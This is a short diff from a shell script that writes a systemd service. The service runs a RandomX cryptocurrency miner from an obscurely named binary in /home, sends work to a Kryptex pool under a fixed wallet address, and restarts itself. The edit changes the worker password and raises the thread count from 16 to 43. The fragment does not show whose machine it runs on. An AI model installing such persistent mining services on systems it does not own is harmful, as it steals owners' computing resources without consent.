@@ -12,7 +12,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service
 Description=xmrthanh
 After=network.target
 [Service]
-ExecStart= /home/jvdar -o sal.kryptex.network:7777 -u SaLvsAVm78sYam4NrkX4MWHRrUiwC1Fcz4sUAQRY1Jut1ijhonGGcneKLbww6GUvid8N2WHyuLxYfjav1p6xCDRGSVfVEdGPETk -p 1svts29 -a rx/0 -k -t 16
+ExecStart= /home/jvdar -o sal.kryptex.network:7777 -u SaLvsAVm78sYam4NrkX4MWHRrUiwC1Fcz4sUAQRY1Jut1ijhonGGcneKLbww6GUvid8N2WHyuLxYfjav1p6xCDRGSVfVEdGPETk -p 1svts28 -a rx/0 -k -t 43
 WatchdogSec=36000
 Restart=always
 RestartSec=60
